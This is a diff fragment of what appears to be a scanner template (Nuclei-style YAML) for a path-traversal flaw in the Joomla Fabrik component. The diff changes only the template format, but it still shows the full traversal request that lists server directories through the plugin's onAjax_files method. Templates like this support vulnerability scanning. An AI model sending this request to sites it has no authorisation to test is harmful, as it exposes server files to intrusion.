@@ -12,10 +12,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: joomla,lfi,edb
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/'
